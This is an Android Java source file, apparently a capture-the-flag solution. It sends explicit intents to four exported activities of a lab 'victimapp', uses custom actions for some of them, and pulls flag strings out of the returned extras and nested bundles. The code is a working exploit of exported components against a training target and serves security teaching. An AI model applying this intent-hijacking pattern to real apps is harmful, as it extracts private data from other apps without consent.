package com.example.maliciousapp;

import android.content.Intent;
import android.os.Bundle;
import android.util.Log;
import android.view.View;
import android.widget.Button;
import android.widget.TextView;

import androidx.activity.EdgeToEdge;
import androidx.annotation.Nullable;
import androidx.appcompat.app.AppCompatActivity;

public class justask extends AppCompatActivity {

    private static final int REQUEST_CODE_INTENT_1 = 1;
    private String Flag = "";
    int count = 1;
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        EdgeToEdge.enable(this);
        setContentView(R.layout.activity_justask);
        ((Button) findViewById(R.id.btn_hackit)).setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View view) {
                Intent intent = new Intent().setClassName("com.example.victimapp", "com.example.victimapp.PartOne");
                startActivityForResult(IntentOrchestrator(), 1);
            }
        });
    }

    @Override
    protected void onActivityResult(int requestCode, int resultCode, @Nullable Intent data) {
        super.onActivityResult(requestCode, resultCode, data);
        Log.i("intent",data.getExtras().toString());
        Utils.showDialog(this, data);
        String partialFlag = ResponseOrchestrator(data);
        if(partialFlag!=null){
            Flag += partialFlag;
            count++;
        }
        ((TextView) findViewById(R.id.txt_hash)).setText("FLAG : " + Flag);
        if (count == 5) Log.d("Flag", Flag);
    }

    private Intent IntentOrchestrator(){
        Intent intent = new Intent();
        switch(count){
            case 1: intent.setClassName("com.example.victimapp", "com.example.victimapp.PartOne");
                break;
            /**************************************************************************************************************/
            case 2: intent.setClassName("com.example.victimapp", "com.example.victimapp.PartTwo");
                intent.setAction("com.example.victimapp.intent.action.JUSTASK");
                break;
            /**************************************************************************************************************/
            case 3: intent.setClassName("com.example.victimapp", "com.example.victimapp.PartThree");
                break;
            /**************************************************************************************************************/
            case 4: intent.setClassName("com.example.victimapp", "com.example.victimapp.PartFour");
                intent.setAction("com.example.victimapp.intent.action.JUSTASKBUTNOTSOSIMPLE");
                break;
            /**************************************************************************************************************/
            default:
                return null;
            /**************************************************************************************************************/
        }
        return intent;
    }

    private String ResponseOrchestrator(Intent data){
        switch(count){
            case 1:
            case 2:
                return data.getStringExtra("flag");
            case 3:
                return data.getStringExtra("hiddenFlag");
            case 4:
                //return data.getParcelableExtra("follow",Bundle);
                return data.getBundleExtra("follow").getBundle("the value").getBundle("rabbit").getBundle("hole").getBundle("deeper").getString("never ending story");
        }
        return null;
    }
}